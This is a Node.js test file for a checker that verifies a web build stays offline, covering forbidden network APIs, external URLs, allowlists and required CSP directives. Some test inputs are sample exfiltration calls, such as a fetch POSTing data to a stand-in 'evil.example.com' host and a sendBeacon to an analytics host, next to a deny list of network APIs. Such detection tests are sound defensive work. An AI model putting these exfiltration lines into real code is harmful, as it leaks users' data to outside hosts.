import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import {
  findForbiddenApis,
  findExternalUrls,
  checkCsp,
  verifyOffline,
  FORBIDDEN_APIS,
} from './offline-rules.mjs';

const GOOD_CSP =
  "default-src 'self'; connect-src 'self'; form-action 'none'; img-src 'self' data:";

const NAMESPACES = ['http://www.w3.org/2000/svg', 'https://react.dev/errors/418'];

test('APIs that exist only to talk to someone else are rejected', () => {
  const cases = [
    ['new WebSocket("ws://x")', 'WebSocket'],
    ['new EventSource("/s")', 'EventSource'],
    ['navigator.sendBeacon("/b", d)', 'navigator.sendBeacon'],
    ['new RTCPeerConnection()', 'RTCPeerConnection'],
    ['importScripts("https://cdn.example.com/w.js")', 'importScripts from a URL'],
  ];
  for (const [source, expected] of cases) {
    assert.ok(findForbiddenApis(source).includes(expected), `missed ${expected}`);
  }
});

test('same-origin fetch is allowed — a local database engine needs it', () => {
  // PGlite loads its own WASM with fetch(..., { credentials: 'same-origin' }).
  // Banning fetch outright would ban running Postgres locally, and `connect-src`
  // already confines where it can go.
  const pglite = "var r = await fetch(e, { credentials: `same-origin` });";
  assert.deepEqual(findForbiddenApis(pglite), []);
  assert.deepEqual(findExternalUrls(pglite), []);
});

test('an external endpoint is caught even when reached through fetch', () => {
  const exfil = 'fetch("https://evil.example.com/collect", { method: "POST", body: data })';
  assert.deepEqual(findExternalUrls(exfil), ['https://evil.example.com/collect']);
});

test('XML namespaces and doc links are not network calls, once allowlisted', () => {
  const source = NAMESPACES.map((u) => `const a = "${u}";`).join('\n');
  // Unlisted, they are reported — the developer must make the call.
  assert.equal(findExternalUrls(source).length, 2);
  // Allowlisted by prefix, they are silent.
  assert.deepEqual(
    findExternalUrls(source, ['http://www.w3.org/', 'https://react.dev/errors/']),
    [],
  );
});

test('an allowlist prefix does not open the whole host', () => {
  const source = 'const a = "https://react.dev/errors/418"; const b = "https://react.dev/collect";';
  assert.deepEqual(findExternalUrls(source, ['https://react.dev/errors/']), [
    'https://react.dev/collect',
  ]);
});

test('localhost is not a shipped network capability', () => {
  assert.deepEqual(findExternalUrls('const dev = "http://localhost:5173/x";'), []);
  assert.deepEqual(findExternalUrls('const dev = "http://127.0.0.1:8080";'), []);
});

test('a sourceMappingURL comment is not a network call', () => {
  // Vite emits these on every chunk. Flagging them would make the check fire on
  // every build, and a check that always fires gets switched off.
  const source = 'const a=1;\n//# sourceMappingURL=https://x/a.js.map';
  assert.deepEqual(findExternalUrls(source), []);
  assert.deepEqual(findForbiddenApis(source), []);
});

test('CSP must carry every directive the guarantee depends on', () => {
  assert.deepEqual(checkCsp(GOOD_CSP), []);
  assert.deepEqual(
    checkCsp("default-src 'self'; form-action 'none'").map((m) => m.directive),
    ["connect-src 'self'"],
  );
  assert.equal(checkCsp('<meta>').length, 3);
});

test('verifyOffline passes a genuinely offline build', async () => {
  const dir = await mkdtemp(path.join(tmpdir(), 'sical-'));
  try {
    await mkdir(path.join(dir, 'assets'), { recursive: true });
    await writeFile(path.join(dir, 'index.html'), `<meta content="${GOOD_CSP}">`);
    await writeFile(
      path.join(dir, 'assets', 'app.js'),
      'const svg = "http://www.w3.org/2000/svg"; await fetch("./db.wasm");',
    );
    const result = await verifyOffline(dir, ['http://www.w3.org/']);
    assert.deepEqual(result.violations, []);
    assert.deepEqual(result.missingCsp, []);
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('verifyOffline fails a build that gained an exfiltration path', async () => {
  const dir = await mkdtemp(path.join(tmpdir(), 'sical-'));
  try {
    await mkdir(path.join(dir, 'assets'), { recursive: true });
    await writeFile(path.join(dir, 'index.html'), `<meta content="${GOOD_CSP}">`);
    await writeFile(
      path.join(dir, 'assets', 'app.js'),
      'navigator.sendBeacon("https://analytics.example.com/t", payload);',
    );
    const result = await verifyOffline(dir);
    const findings = result.violations.map((v) => v.finding);
    assert.ok(findings.includes('navigator.sendBeacon'));
    assert.ok(findings.some((f) => f.includes('analytics.example.com')));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('verifyOffline fails a build whose CSP was weakened', async () => {
  const dir = await mkdtemp(path.join(tmpdir(), 'sical-'));
  try {
    await writeFile(path.join(dir, 'index.html'), '<meta content="default-src \'self\'">');
    const result = await verifyOffline(dir);
    assert.ok(result.missingCsp.some((m) => m.directive === "connect-src 'self'"));
  } finally {
    await rm(dir, { recursive: true, force: true });
  }
});

test('the rule list is not accidentally empty', () => {
  // A check that checks nothing passes everything.
  assert.ok(FORBIDDEN_APIS.length >= 5);
});
